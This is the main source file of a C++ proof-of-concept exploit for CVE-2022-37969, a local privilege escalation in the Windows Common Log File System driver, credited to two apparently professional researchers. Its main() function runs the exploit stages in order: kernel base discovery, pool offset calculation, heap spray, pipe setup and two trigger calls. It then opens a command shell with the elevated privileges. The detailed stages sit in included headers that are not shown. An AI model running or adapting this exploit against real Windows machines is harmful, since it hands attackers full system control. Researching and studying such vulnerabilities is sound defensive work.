//
// Understanding the CVE-2022-37969 Windows Common Log File System Driver Local Privilege Escalation. 
// Authors: Ricardo.Narvaja@fortra.com Esteban.kazimirow@fortra.com
//
#pragma warning (disable : 4005)

#include <stdio.h>
#include <iostream>
#include <windows.h>
#include <clfsw32.h>
#include <ntstatus.h>
#include <processthreadsapi.h>
#include <tchar.h>
#include <tlhelp32.h>
#include "ntos.h"
#include "crc32.h"
#include "head.h"
#include "init.h"
#include "leak.h"
#include "CreateLogFile.h"
#include "Prepare_BigPool.h"
#include "preparePipe.h"

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Clfsw32.lib")



int main(int argc, TCHAR* argv[])
{

	getOSversion();
	InitializeWindowsApiWrappers();
	// Initialize Environment
	InitEnvironment();
	FindKernelModulesBase();
	GetOffsetBetweenPools();
	doHeapSpray();
	preparePipe();
	trigger();	
	GetOffsetBetweenPools();
	trigger2();
	// fork cmd
	system("cmd.exe /c start cmd.exe");
	return 0;
}